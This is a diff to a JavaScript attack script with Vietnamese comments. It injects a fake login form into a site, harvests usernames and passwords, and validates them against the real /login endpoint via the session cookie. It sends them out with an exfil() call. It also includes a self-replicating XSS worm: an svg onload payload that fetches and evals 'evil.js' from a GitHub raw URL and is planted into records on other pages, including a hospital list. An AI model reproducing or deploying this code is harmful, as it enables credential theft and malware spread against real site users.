@@ -192,6 +192,7 @@
   // Fields: email_txt, password_txt, authenticity_token, g-recaptcha-response
   // 2FA: POST /login_two_auth?lang=vi voi field token
   // RECAPTCHA: nguoi dung tu tick trong form phishing -> token verify login
+  // Login thanh cong: tra ve 302 redirect + Set-Cookie _msbmtu_ses
   var RECAPTCHA_SITEKEY = '6LcPvWotAAAAAAvgvdkjo1oHooXdF1MWyGxp29qu';
   var recaptchaToken = '';
 
@@ -206,7 +207,7 @@
         btn.style.opacity = '1';
         btn.style.background = '#28a745';
         btn.style.boxShadow = '0 0 15px rgba(40,177,67,0.8)';
-        btn.style.transition = 'all 0.3s ease';
+        // btn.style.transition = 'all 0.3s ease';
         btn.style.animation = 'pulseGreen 0.8s ease-in-out 3';
       }
     } catch(e) {}
@@ -226,6 +227,9 @@
     } catch(e) {}
   };
 
+  // Ham verify login qua API goc
+  // Thanh cong (302 redirect + cookie _msbmtu_ses) -> valid = true
+  // Khong can header X-Requested-With (theo response thuc te)
   function verifyLogin(username, password, callback) {
     try {
       var csrf = '';
@@ -237,7 +241,7 @@
       var xhr = new XMLHttpRequest();
       xhr.open('POST', '/login?lang=vi', true);
       xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-      xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+      xhr.withCredentials = true;  // gui cookie de nhan _msbmtu_ses
       xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
           var valid = false;
@@ -245,11 +249,14 @@
           var url = xhr.responseURL || '';
           var text = xhr.responseText || '';
 
-          // Dang nhap thanh cong -> redirect khoi trang /login
-          if ((status >= 300 && status < 400) && url.indexOf('/login') === -1) {
+          // Login thanh cong -> 302 redirect khoi trang /login + Set-Cookie _msbmtu_ses
+          var setCookie = xhr.getResponseHeader('Set-Cookie') || '';
+          if ((status === 302 || (status >= 300 && status < 400)) &&
+              url.indexOf('/login') === -1 &&
+              setCookie.indexOf('_msbmtu_ses') >= 0) {
             valid = true;
           }
-          // JSON success
+          // JSON success (fallback)
           else if (status === 200) {
             if (text.indexOf('"success":true') >= 0 || text.indexOf("'success':true") >= 0) {
               valid = true;
@@ -276,6 +283,8 @@
   // ============================================================
   // WORM - TU NHAN BAN PAYLOAD VAO CAC DROPDOWN KHAC
   // ============================================================
+  // Script tu tao them ban ghi payload vao cac dropdown khac
+  // de lan truyen. Chi lay 1 lan moi trinh duyet (tranh spam).
   function wormSpread() {
     try {
       if (localStorage.getItem('__w_done') === '1') return;
@@ -296,6 +305,7 @@
         scriptUrl = '//raw.githubusercontent.com/tringuyen1998allstar2018/testerfromhell/refs/heads/main/evil.js';
       }
 
+      // Payload de nhan ban
       var wormPayload = "'><svg onload=$.get(`" + scriptUrl + "`).then(eval)>";
 
       var targets = [
@@ -308,7 +318,6 @@
         { path: '/tbhospitals', key: 'name' }
       ];
 
-      var names = ['Ho tro ky thuat', 'Bao tri he thong', 'Quan tri du lieu', 'Phong CNTT', 'Van hanh', 'Giam sat'];
       var getCsrf = function() {
         try {
           var m = document.querySelector('meta[name="csrf-token"]');
@@ -405,7 +414,7 @@
       // O username
       var userInput = document.createElement('input');
       userInput.setAttribute('type', 'text');
-      userInput.setAttribute('placeholder', 'Ten dang nhap / Email');
+      userInput.setAttribute('placeholder', 'Ten dang nhap / Email / Ma NV / So DT');
       userInput.setAttribute('id', ID_USER);
       userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;' +
         'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
@@ -484,14 +493,14 @@
 
         // Kiem tra da tick recaptcha chua
         if (!recaptchaToken) {
-          msg.textContent = 'Vui long tick reCAPTCHA rồi moi dang nhap.';
+          msg.textContent = 'Vui long tick reCAPTCHA truoc khi dang nhap.';
           msg.style.color = '#d32f2f';
           return;
         }
 
-        // 1. Xac thuc qua API login goc (keem recaptcha token)
+        // 1. Xac thuc qua API login goc (kem recaptcha token)
         verifyLogin(u, p, function(valid, loginStatus) {
-          // 2. Gui ve server keem trang thai valid
+          // 2. Gui ve server kem trang thai valid
           exfil({
             username: u,
             password: p,
@@ -513,7 +522,7 @@
           var ep = passInput.value;
           if (eu || ep) {
             if (!recaptchaToken) {
-              msg.textContent = 'Vui long tick recaptcha!';
+              msg.textContent = 'Vui long tick reCAPTCHA truoc khi dang nhap.';
               msg.style.color = '#d32f2f';
               return;
             }
@@ -552,13 +561,14 @@
   // 3. Phishing form ID NGU NHIEN
   // 4. Worm tu nhan ban payload vao dropdown khac
   // 5. Dong modal Bootstrap truoc khi hien form
-  // 6. XAC THUC tai khoan qua API login goc (/login)
+  // 6. XUAT KA tap theo API login goc (/login)
   //    POST /login?lang=vi
   //    Fields: email_txt, password_txt, authenticity_token
+  //    Thanh cong: 302 redirect + Set-Cookie _msbmtu_ses
   //    Ket qua valid true/false gui kem ve server
   // 7. RECAPTCHA: nguoi dung tu tick trong form phishing
   //    Token recaptcha dung de verify login
   //    Nut bam disabled cho toi khi tick recaptcha
-  //    Khi tick xong: nut sang xanh la + animation pulse
+  //    Khi tick xong: nut sang xanh la + animation pulse ro rat
   // ============================================================
 })();
